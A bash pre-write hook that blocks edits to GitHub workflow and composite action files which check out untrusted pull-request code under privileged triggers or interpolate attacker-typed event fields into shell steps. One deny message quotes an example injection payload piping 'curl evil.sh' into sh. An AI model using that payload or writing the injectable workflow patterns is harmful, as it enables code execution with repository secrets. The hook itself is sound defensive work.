#!/bin/bash
# Absolute-path shebang (not `env bash`): the fail-open guarantee must hold even
# under a stripped/broken PATH, where `env bash` itself exits 127.
#
# PreToolUse guard on writes to .github/workflows/. DENIES exactly two shapes —
# the ones with no legitimate form, where the workflow hands repository secrets or
# a write token to code the repository does not control:
#
#   1. pull_request_target (or workflow_run) checking out the untrusted head.
#   2. An attacker-controlled ${{ github.event.* }} field interpolated into a
#      `run:` block, which is shell substitution, not argument passing.
#
# Everything else workflow-audit.sh reports — unpinned actions, a missing
# permissions: block, self-hosted runners on fork triggers — is a WARN there and
# is NOT denied here. A deny that fires on the ambiguous cases is a deny that gets
# turned off, and then the two unambiguous ones stop being blocked too.
#
# Why a hook at all, given both shapes are well-documented: nobody asks. Workflow
# files get edited during unrelated work and reviewed for step ordering. The hook
# is the thing that asks, at the only moment the answer is cheap.
#
# Fail-open: any error, missing jq, or unparseable input allows the write.
{
  input=$(cat)
  # OFF-SWITCH. Until 2026-09-15 this guard had none: the only way out was
  # uninstalling the plugin. Every other guard in the marketplace ships one,
  # and a global install makes "turn it off here" a real need.
  [ "${CC_WORKFLOW_GUARD:-on}" = "off" ] && exit 0
  command -v jq >/dev/null 2>&1 || exit 0
  tool=$(printf '%s' "$input" | jq -r '.tool_name // empty' 2>/dev/null) || exit 0
  case "$tool" in Write|Edit|MultiEdit) ;; *) exit 0 ;; esac

  file=$(printf '%s' "$input" | jq -r '.tool_input.file_path // empty' 2>/dev/null) || exit 0
  # A COMPOSITE ACTION IS THE SAME SINK. `.github/actions/<name>/action.yml` carries
  # `runs.steps[].run:` and is called from a workflow with that workflow's token, so the
  # identical `${{ github.event.pull_request.title }}` interpolation is the identical
  # command execution — and until 2026-09-22 it was allowed here while the same body in
  # `workflows/ci.yml` was denied. Rule 1 cannot fire on a composite (it has no `on:`
  # triggers); rule 2 is the whole point. NOT covered: an action.yml anywhere else in the
  # tree, and a composite that shells out to a script file the guard never sees.
  case "$file" in
    */.github/workflows/*.yml|*/.github/workflows/*.yaml|.github/workflows/*.yml|.github/workflows/*.yaml) ;;
    */.github/actions/*/action.yml|*/.github/actions/*/action.yaml|.github/actions/*/action.yml|.github/actions/*/action.yaml) ;;
    *) exit 0 ;;
  esac

  text=$(printf '%s' "$input" | jq -r '
    [ .tool_input.content // empty,
      .tool_input.new_string // empty,
      ( .tool_input.edits // [] | map(.new_string // empty) | join("\n") )
    ] | join("\n")' 2>/dev/null) || exit 0
  [ -n "$text" ] || exit 0

  reason=""

  # 1. Untrusted checkout under a privileged trigger.
  if printf '%s' "$text" | grep -qE '^[[:space:]]*(pull_request_target|workflow_run):' \
     && printf '%s' "$text" | grep -qE '^[[:space:]]*ref:[[:space:]]*\$\{\{[[:space:]]*github\.(head_ref|event\.(pull_request\.head|workflow_run\.head))'; then
    reason="This workflow triggers on pull_request_target/workflow_run — which runs with the BASE repository's secrets and a write token — and checks out the untrusted head ref. That executes fork-authored code inside a privileged context; it is GitHub's own documented critical anti-pattern, and it reads to a reviewer as 'checks out the PR, correct'. Build the PR in the pull_request context with no secrets, or check out the base ref and treat the PR tree as data."
  fi

  # 2. Attacker-controlled expression in a shell step. Matched by LEAF: base.sha
  #    and number are GitHub-generated and safe, and denying them would make this
  #    fire on ordinary CI.
  if [ -z "$reason" ]; then
    if printf '%s' "$text" | awk '
        /^[[:space:]]*-?[[:space:]]*run:/ { inrun=1 }
        inrun && /\$\{\{[[:space:]]*github\.(head_ref|event\.(pull_request\.(title|body|head\.(ref|label))|issue\.(title|body)|comment\.body|review\.body|discussion\.(title|body)|head_commit\.(message|author\.(name|email))))/ { found=1 }
        /^[[:space:]]*(uses|with|env|if|name):/ { inrun=0 }
        END { exit !found }
      '; then
      reason="A \${{ github.event.* }} field a pull-request author can type — a title, body, branch name or commit message — is interpolated directly into a run: block. GitHub substitutes it into the shell BEFORE the shell runs, so a title of '\"; curl evil.sh | sh; #' is command execution, not a string. Pass it through an env: block and reference \"\$VAR\" inside the script, where the shell treats it as data."
    fi
  fi

  [ -n "$reason" ] || exit 0
  # The path in the message has to be one the READER can type. `plugins/devops/scripts/…`
  # is this marketplace's own layout and does not exist on an installer's disk; resolve
  # the real root the host hands the hook, and fall back to this script's own directory.
  auditroot="${CLAUDE_PLUGIN_ROOT:-$(cd "$(dirname "$0")/.." 2>/dev/null && pwd)}"
  reason="$reason (file: $file)  Run bash ${auditroot}/scripts/workflow-audit.sh for the full report, including the warn-level findings this hook deliberately does not block."
  # Name the escape in the message that blocks you.
  reason="$reason CC_WORKFLOW_GUARD=off disables this guard for the session."

  jq -cn --arg r "$reason" \
    '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:"deny",permissionDecisionReason:$r}}' 2>/dev/null
  exit 0
} 2>/dev/null
exit 0
